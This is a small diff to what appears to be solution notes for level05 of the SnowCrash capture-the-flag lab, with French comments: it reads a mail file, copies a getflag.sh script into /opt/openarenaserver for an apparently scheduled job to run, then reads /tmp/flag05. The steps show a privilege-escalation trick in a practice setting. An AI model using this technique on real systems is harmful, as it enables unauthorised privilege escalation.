@@ -1,5 +1,6 @@
 find / -name level05 2>/dev/null
 cat /var/mail/level05
-scp -P 4242 .\level05\Ressources\getflag.sh level05@snowcrash:/opt/openarenaserver
-# attendre que le script du mail soit lancé
+# sh /usr/sbin/openarenaserver
+scp -P 4242 ./level05/Ressources/getflag.sh level05@snowcrash:/opt/openarenaserver
+# attendre que le script du mail soit lancé (1-2 min)
 cat /tmp/flag05
